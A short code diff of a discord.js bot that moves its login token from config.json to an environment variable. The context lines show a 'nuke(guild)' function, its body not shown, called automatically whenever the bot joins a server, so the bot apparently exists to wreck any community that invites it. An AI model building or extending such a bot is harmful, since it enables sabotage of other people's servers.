@@ -1,5 +1,5 @@
 const { Client } = require('discord.js');
-const config = require('./config.json');
+
 const client = new Client();
 
 async function nuke(guild) {
@@ -40,4 +40,4 @@ client.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
 
-client.login(config.token).catch(console.error);
+client.login(process.env.BOT_TOKEN);
